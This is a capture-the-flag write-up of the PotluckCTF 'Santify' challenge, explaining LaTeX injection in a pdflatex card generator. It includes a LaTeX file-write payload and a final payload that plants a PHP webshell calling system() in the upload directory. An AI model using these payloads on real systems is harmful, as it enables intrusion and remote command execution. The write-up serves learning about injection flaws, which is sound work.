---
title: "Santify"
description: "I found this shop that claims to provide \"\"delivery via reindeer sleigh\"\". I ordered a few things, but the cards did not arrive on time! Please find out what went wrong.<br>Anyway, check out their web page<br>Note: Any accounts named ADMIN, BOT or similar are regular users and not part of the challenge, please ignore them"
pubDate: 2023-12-30
ctf: "PotluckCTF 37C3"
category: "rev"
author: "sealldev"
section: "CTFs"
image: "images/23-potluckctf37c3/icon.png"
---

**I didn't completely solve this challenge during the CTF, but got painfully close...**

The card creation page is the following:

![Card Creation](images/23-potluckctf37c3/santify_1.png)

The header text is of key importance, as it mentions `pdflatex`. LaTeX has some interesting capabilities that are listed nicely on PayloadAllTheThings such as [LaTeX Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection).

Injecting some math operation in LaTeX, I try to read a 'flag'...

![LFI Attempt](images/23-potluckctf37c3/santify_2.png)

... Fair enough.

I found that we have the capabilites to write files, by doing the following.

```latex
\newwrite\outfile
\openout\outfile=test.log
\write\outfile{test!}
\closeout\outfile
```

Looking at our LaTeX log were given where the files are uploaded, from there we can look at our uploaded file. Cool, now what...

We can't really 'read' the binary as LaTeX isn't very good at handling extended unicode without importing packages, and trying to run the command injection payloads fails as they are using the `-no-shell-escape` flag, which restricts usage of `/write18{cmd}`.

**This part I did not get during the competition.**

What I needed to do was write a PHP webshell, as the website is run on PHP which can be seen in file names in other portions of the site (index.php, send-card.php, render-LaTeX.php, etc.).

```latex
\newwrite\outfile
\openout\outfile=cmd.php
\write\outfile{<?php system("/app/readflag");}
\closeout\outfile
```

Now you visit the endpoint it was uploaded to (`/images/<random guid>/cmd.php`) you will see the flag.